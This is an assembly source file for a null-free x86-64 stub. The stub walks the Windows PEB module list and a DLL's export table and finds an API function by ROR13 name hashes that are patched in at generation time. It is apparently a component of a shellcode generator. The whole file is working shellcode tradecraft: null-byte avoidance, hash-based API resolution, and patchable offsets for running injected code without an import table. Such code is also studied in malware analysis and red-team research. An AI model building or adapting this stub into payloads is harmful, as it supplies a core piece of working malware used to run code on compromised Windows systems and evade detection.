; peb_walk.asm — null-free PEB walk + export walk stub
; Assembled with: nasm -f bin peb_walk.asm -o peb_walk.bin
;
; Inputs (patched at generation time):
;   DLL_HASH_OFF  = 76   (u32 LE) — ROR13 tolower hash of dll name
;   FUNC_HASH_OFF = 164  (u32 LE) — ROR13 hash of export name (no tolower)
;
; Outputs:
;   r12 = absolute address of target export
;   r13 = dll base address
;
; Clobbers: rax, rcx, rdx, r8, r9, r14, rbp
; Preserved: rsp, r10, r11, r15 (used by scw_set_rax)
;
; All instructions are null-free (verified).
; rbp is zeroed at entry and used as zero register for null-free addressing.

bits 64

%define DLL_HASH  0x11223344   ; patched at offset 76
%define FUNC_HASH 0x55667788   ; patched at offset 164

_start:
    ; ── get PEB ────────────────────────────────────────────────────
    ; gs:[rip+0x60] has null bytes — use gs:[rbp+0x60] with rbp=0
    xor     rbp, rbp                    ; rbp = 0 (zero register)
    mov     rax, [gs:rbp+0x60]          ; rax = PEB (65 48 8B 45 60, no nulls)
    mov     rax, [rax+0x18]             ; rax = PEB.Ldr
    mov     rax, [rax+0x20]             ; rax = InMemoryOrderModuleList.Flink
    mov     r14, rax                    ; r14 = list head (loop terminator)

    ; ── PEB walk: find dll by ROR13 tolower hash ───────────────────
.next_mod:
    mov     rax, [rax+rbp]              ; rax = Flink (rbp=0, avoids null in [rax+0])
    mov     r13, [rax+0x20]             ; r13 = DllBase (InMemoryOrder+0x20)
    mov     rcx, [rax+0x50]             ; rcx = BaseDllName.Buffer (PWSTR)

    xor     edx, edx                    ; edx = hash accumulator = 0
.hash_mod_char:
    movzx   r8d, word [rcx]             ; r8d = next wchar (zero-extends)
    test    r8d, r8d                    ; null terminator?
    jz      .hash_mod_done
    ror     edx, 13                     ; ROR13
    movzx   r8d, r8b                    ; use low byte only (wchar → char)
    ; tolower: if 'A'(0x41) <= r8d <= 'Z'(0x5A), add 0x20
    cmp     r8d, 0x41
    jl      .no_upper
    cmp     r8d, 0x5A
    jg      .no_upper
    add     r8d, 0x20
.no_upper:
    add     edx, r8d                    ; hash += char
    add     rcx, 2                      ; next wchar (2 bytes)
    jmp     .hash_mod_char
.hash_mod_done:
    cmp     edx, DLL_HASH               ; match? (patched at offset 76)
    je      .found_mod
    cmp     rax, r14                    ; back at list head = not found
    jne     .next_mod
    jmp     .done                       ; not found — r12 stays 0

.found_mod:
    ; r13 = DllBase of target dll
    ; ── export walk: find export by ROR13 hash (no tolower) ────────
    mov     eax, [r13+0x3C]             ; eax = e_lfanew (RVA of NT headers)
    add     rax, r13                    ; rax = IMAGE_NT_HEADERS64*
    add     rax, 0x18                   ; rax = OptionalHeader
    add     rax, 0x70                   ; rax = DataDirectory[0].VirtualAddress
    ; [rax+0] has null — use [rax+rbp] (rbp=0)
    mov     eax, [rax+rbp]              ; eax = ExportDir RVA
    add     rax, r13                    ; rax = IMAGE_EXPORT_DIRECTORY*
    mov     rcx, rax                    ; rcx = ExportDir (preserved across loop)

    mov     r8d, [rcx+0x18]             ; r8d = NumberOfNames
    mov     eax, [rcx+0x20]             ; eax = AddressOfNames RVA
    add     rax, r13                    ; rax = names array
    mov     r14, rax                    ; r14 = names array

.next_export:
    dec     r8d                         ; i--
    js      .done                       ; i < 0 → not found

    mov     eax, [r14+r8*4]             ; eax = Names[i] RVA
    add     rax, r13                    ; rax = name string*

    xor     r9d, r9d                    ; r9d = hash = 0
.hash_exp_char:
    ; [rax+0] has null — use [rax+rbp] (rbp=0)
    movzx   edx, byte [rax+rbp]         ; edx = next char
    test    dl, dl                      ; null terminator?
    jz      .hash_exp_done
    ror     r9d, 13                     ; ROR13 (no tolower for export names)
    add     r9d, edx                    ; hash += char
    inc     rax                         ; next char
    jmp     .hash_exp_char
.hash_exp_done:
    cmp     r9d, FUNC_HASH              ; match? (patched at offset 164)
    je      .found_export
    jmp     .next_export

.found_export:
    ; resolve ordinal → function address
    mov     eax, [rcx+0x24]             ; eax = AddressOfNameOrdinals RVA
    add     rax, r13                    ; rax = ordinals array
    movzx   eax, word [rax+r8*2]        ; eax = ordinal for Names[i]
    mov     edx, [rcx+0x1C]             ; edx = AddressOfFunctions RVA
    add     rdx, r13                    ; rdx = functions array
    mov     eax, [rdx+rax*4]            ; eax = function RVA
    add     rax, r13                    ; rax = absolute function address
    mov     r12, rax                    ; r12 = target function address

.done: